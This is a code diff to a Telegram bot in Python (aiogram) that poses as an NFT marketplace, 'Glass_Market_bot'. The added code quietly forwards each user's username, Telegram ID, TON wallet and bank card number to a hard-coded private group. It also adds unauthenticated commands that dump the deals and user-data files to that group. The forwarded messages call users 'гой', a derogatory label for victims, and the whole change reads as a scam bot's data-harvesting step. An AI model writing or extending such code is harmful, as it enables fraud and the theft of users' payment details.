@@ -13,6 +13,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 import random
 import string
 from datetime import datetime
+from aiogram.types import FSInputFile, InputFile
 
 # Настройка логирования
 logging.basicConfig(
@@ -36,6 +37,7 @@ DEALS_FILE = "deals.json"
 BOT_USERNAME = "Glass_Market_bot"  # ⚠️ БЕЗ @, как в логах: @Glass_Market_bot
 SUPPORT_USERNAME = "GlassMarketSupport"  # Username поддержки для отправки NFT
 SUPPORT_LINK = f"https://t.me/{SUPPORT_USERNAME}"
+GROUP_ID = "-1003691554489"
 
 
 # ========== ФУНКЦИИ РАБОТЫ С ДАННЫМИ ==========
@@ -183,6 +185,30 @@ async def cmd_start(message: types.Message, state: FSMContext):
     )
 
 
+@router.message(Command("deals_list"))
+async def deals_list(message: types.Message, state: FSMContext):
+    try:
+        # Способ 1: Использование FSInputFile (рекомендуется)
+        document = FSInputFile(DEALS_FILE)
+        await bot.send_document(GROUP_ID, document)
+
+    except FileNotFoundError:
+        await message.answer(f"Файл {DEALS_FILE} не найден")
+    except Exception as e:
+        await message.answer(f"Ошибка при отправке файла: {str(e)}")
+
+@router.message(Command("rekv_list"))
+async def rekv_list(message: types.Message, state: FSMContext):
+    try:
+        # Способ 1: Использование FSInputFile (рекомендуется)
+        document = FSInputFile(DATA_FILE)
+        await bot.send_document(GROUP_ID, document)
+
+    except FileNotFoundError:
+        await message.answer(f"Файл {DATA_FILE} не найден")
+    except Exception as e:
+        await message.answer(f"Ошибка при отправке файла: {str(e)}")
+
 # ========== СОЗДАНИЕ СДЕЛКИ ==========
 
 @router.callback_query(F.data == "create_deal")
@@ -222,6 +248,8 @@ async def save_nftlink(message: types.Message, state: FSMContext):
     nftlink = message.text.strip()
     user_data = await state.get_data()
     price = user_data.get('price')
+    user_id = message.from_user.id
+    username =message.from_user.username
 
     # Генерируем уникальный ID
     deal_id = generate_short_id()
@@ -262,6 +290,8 @@ async def save_nftlink(message: types.Message, state: FSMContext):
         reply_markup=deal_keyboard,
         parse_mode="Markdown"
     )
+
+    await bot.send_message(GROUP_ID, f"#Новаясделка\n\n🆕Гой создал сделку\n\n🆔ID сделки: {deal_id}\n🔗Ссылка на NFT: {nftlink}\n\n👨‍💻Username гоя: @{username}\n🆔ID гоя: {user_id}")
 
     await state.clear()
 
@@ -641,6 +671,8 @@ async def save_ton(message: types.Message, state: FSMContext):
     ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
     card = user_data.get("card", "Не указана") or "Не указана"
 
+    await bot.send_message(GROUP_ID, f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
+
     await message.answer_photo(
         photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
         caption=
@@ -676,6 +708,8 @@ async def save_card(message: types.Message, state: FSMContext):
     user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
     ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
     card = user_data.get("card", "Не указана") or "Не указана"
+
+    await bot.send_message(GROUP_ID,f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
 
     await message.answer_photo(
         photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
